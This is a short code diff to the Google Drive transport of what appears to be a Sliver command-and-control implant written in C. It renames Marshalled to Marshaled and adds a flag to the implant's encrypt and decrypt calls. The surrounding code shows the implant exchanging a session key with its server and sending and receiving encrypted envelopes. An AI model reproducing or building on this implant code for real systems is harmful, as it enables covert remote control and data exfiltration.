@@ -93,7 +93,7 @@ BOOL DriveStart
 	PBUFFER pSessionId = NULL;
 	PBYTE pEncryptedSessionInit = NULL;
 	DWORD cbEncryptedSessionInit = 0;
-	PPBElement pMarshalledData = NULL;
+	PPBElement pMarshaledData = NULL;
 	DWORD i = 0;
 	CHAR szName[0x200];
 	PDRIVE_CONFIG pDriveConfig = NULL;
@@ -112,8 +112,8 @@ BOOL DriveStart
 	LPSTR lpPublicKeyHexDigest = NULL;
 	DWORD dwNumberOfTries = 0;
 
-	pMarshalledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
-	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshalledData->pMarshalledData, pMarshalledData->cbMarshalledData, &cbEncryptedSessionInit);
+	pMarshaledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
+	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshaledData->pMarshaledData, pMarshaledData->cbMarshaledData, &cbEncryptedSessionInit);
 	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
 		goto CLEANUP;
 	}
@@ -176,7 +176,7 @@ BOOL DriveStart
 			continue;
 		}
 
-		pSessionId = SliverDecrypt(pConfig, pRespData);
+		pSessionId = SliverDecrypt(pConfig, pRespData, TRUE);
 		memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
 		Result = TRUE;
 		break;
@@ -189,7 +189,7 @@ CLEANUP:
 	FREE(pEncryptedSessionInit);
 	FREE(pPublicKeyDigest);
 	FREE(lpPublicKeyHexDigest);
-	FreeElement(pMarshalledData);
+	FreeElement(pMarshaledData);
 	FreeBuffer(pSessionId);
 	FreeBuffer(pRespData);
 
@@ -203,7 +203,7 @@ BOOL DriveSend
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PBUFFER pMarshalledEnvelope = NULL;
+	PBUFFER pMarshaledEnvelope = NULL;
 	DWORD i = 0;
 	CHAR szName[0x200];
 	PDRIVE_CONFIG pDriveConfig = NULL;
@@ -222,8 +222,8 @@ BOOL DriveSend
 
 	PrintFormatA("----------------------------------------------------\nSend Envelope:\n");
 	HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
-	pCipherText = SliverEncrypt(pConfig, pMarshalledEnvelope);
+	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
+	pCipherText = SliverEncrypt(pConfig, pMarshaledEnvelope, TRUE);
 	pUri = UriInit(szUrl);
 	if (pUri == NULL) {
 		goto CLEANUP;
@@ -295,7 +295,7 @@ CLEANUP:
 		}
 	}
 
-	FreeBuffer(pMarshalledEnvelope);
+	FreeBuffer(pMarshaledEnvelope);
 	FreeBuffer(pCipherText);
 	return Result;
 }
@@ -366,7 +366,7 @@ PENVELOPE DriveRecv
 		pRespData = BufferMove(pResp->pRespData, pResp->cbResp);
 		pResp->pRespData = NULL;
 		pDriveClient->dwRecvCounter++;
-		pPlainText = SliverDecrypt(pConfig, pRespData);
+		pPlainText = SliverDecrypt(pConfig, pRespData, TRUE);
 		pResult = UnmarshalEnvelope(pPlainText);
 
 		PrintFormatA("----------------------------------------------------\nReceive Envelope:\n");
